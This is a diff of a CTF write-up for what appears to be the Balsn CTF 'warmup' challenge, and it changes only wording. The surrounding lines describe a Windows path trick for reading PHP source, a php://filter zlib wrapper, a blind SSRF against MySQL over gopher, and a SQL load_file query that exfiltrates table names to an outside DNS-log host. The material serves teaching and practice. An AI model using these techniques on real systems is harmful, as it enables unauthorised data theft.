@@ -30,7 +30,6 @@ This challenge consists of many simple and old PHP/Windows tricks.
 ### Step 1
 
 In this challenge, you should refactor the code first. 
-
 (Because the source code is so ugly and hard to read :p)
 
 After refactoring, you will get the clean code like this:
@@ -136,11 +135,11 @@ To bypass this restriction to read the php source code, you just need to append 
 
 `config.php[SPACE]`
 
-(Because the server is running on Windows, so there are some weird path normalization rule here :p)
+(Because the server is running on Windows, there are some weird path normalization rule here :p)
 
 <br>
 
-So if you try to read the source code of `config.php` like this:
+If you try to read the source code of `config.php` like this:
 
 `http://warmup.balsnctf.com/?op=-99&%E2%81%A3=config.php%20`
 
@@ -158,11 +157,11 @@ Because the third argument of `file_get_contents()` is 155. (Read 155 Bytes only
 
 <br>
 
-We should use some special php wrapper to compress the content of `config.php`.
+We should use some special php wrapper to compress the content of `config.php` first.
 
 And `php://filter/zlib.deflate` is your best friend!
 
-use `zlib.deflate` to compress the content and then decompress it by using `zlib.inflate`.
+Use `zlib.deflate` to compress the content and then decompress it by using `zlib.inflate`.
 
 Script:
 
@@ -257,7 +256,7 @@ Now, you have a blind SSRF!
 
 For the MySQL protocol, you can use some tools like [Gopherus](https://github.com/tarunkant/Gopherus) to create the gopher payload.
 
-At last, you just need to use Time-based or Out-of-band (DNS log) methods to exfiltration the query result.
+At last, you just need to use Time-based or Out-of-band (DNS log) methods to exfiltrate the query result.
 
 - `select load_file(concat("\\\\",table_name,".e222e6f24ba81a9b414f.d.zhack.ca/a")) from information_schema.tables where table_schema="ThisIsTheDbName";`
     - Output: `fl4ggg`
